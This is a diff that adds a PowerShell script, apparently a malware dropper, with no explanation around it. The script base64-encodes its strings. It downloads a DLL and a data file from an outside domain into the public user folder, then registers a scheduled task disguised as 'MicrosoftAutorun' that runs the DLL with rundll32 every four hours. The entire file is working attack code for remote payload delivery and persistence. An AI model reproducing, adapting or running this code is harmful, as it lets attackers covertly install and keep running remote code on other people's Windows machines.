@@ -1,0 +1,65 @@
+function cr($Text){
+return  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Text))
+}
+function dd($u, $p) {
+	$comname=cr("TQBzAHgAbQBsADIALgBTAGUAcgB2AGUAcgBYAE0ATABIAFQAVABQAC4ANgAuADAA")
+	$url=cr($u)
+	$path=cr($p)
+	$Http = new-object -com $comname
+	$Http.open("GET",$url,$false)
+	$Http.send()
+	$classid=cr("MAAwADAAMAAwADUANgA2AC0AMAAwADAAMAAtADAAMAAxADAALQA4ADAAMAAwAC0AMAAwAEEAQQAwADAANgBEADIARQBBADQA")
+	$ado = [activator]::CreateInstance([type]::GetTypeFromCLSID($classid))
+	$ado.Type=1
+	$ado.Open()
+	$ado.Write($Http.responseBody)
+	$ado.SaveToFile($path,2)
+	$ado.Close()
+}
+
+
+function cc{
+    $TaskName = "MicrosoftAutorun"
+    $TaskDescr = "MicrosoftAutorun"
+    $TaskCommand = "rundll32.exe"
+    $TaskArg = "c:\users\public\plugin.dll,x"
+    $TaskStartTime = [datetime]::Now.AddMinutes(5) 
+    $ScheduleObject = new-object -ComObject(cr("UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA="))
+    $ScheduleObject.Connect()
+    $rootFolder = $ScheduleObject.GetFolder("\")
+    $TaskDefinition = $ScheduleObject.NewTask(0) 
+    $TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
+    $TaskDefinition.RegistrationInfo.Author = "user"
+    $TaskDefinition.Settings.Enabled = $true
+    $TaskDefinition.Settings.AllowDemandStart = $true
+    $TaskDefinition.Settings.DisallowStartIfOnBatteries = $false
+    $triggers = $TaskDefinition.Triggers
+    $trigger = $triggers.Create(1) 
+    $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
+    $reptitionpattern=$trigger.Repetition
+    $reptitionpattern.Interval = "PT4H"  
+    $trigger.Enabled = $true
+    $Action = $TaskDefinition.Actions.Create(0)
+    $action.Path = "$TaskCommand"
+    $action.Arguments = "$TaskArg"
+    #$action.HideAppWindow = $true
+    $rootFolder.RegisterTaskDefinition($TaskName,$TaskDefinition,6,"","",3)
+}
+function c2{
+    $sched = new-object -ComObject(cr("UwBjAGgAZQBkAHUAbABlAC4AUwBlAHIAdgBpAGMAZQA="))
+    $sched.Connect()
+    $folder = $sched.GetFolder('\')
+    if(-not (Test-Path -Path "c:\users\public\plugin.dll" )){#not exsit
+    dd "aAB0AHQAcAA6AC8ALwBkAGUAZgBlAG4AYwBlAGQAcgBvAGQALgBpAG4ALwBoAGcAawBzAGQAaABnAGkAbwBoAC8AdwBpAG4AdQBwAC4AZABsAGwA" "YwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABwAGwAdQBnAGkAbgAuAGQAbABsAA=="
+    dd "aAB0AHQAcAA6AC8ALwBkAGUAZgBlAG4AYwBlAGQAcgBvAGQALgBpAG4ALwBoAGcAawBzAGQAaABnAGkAbwBoAC8AdABlAHMAdAAuAGQAYQB0AA==" "YwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXAB0AGUAcwB0AC4AZABhAHQA"
+    
+	}
+    Try{
+     $task = $folder.GetTask("MicrosoftAutorun")
+   }
+    Catch{
+    cc
+    }
+
+}
+c2
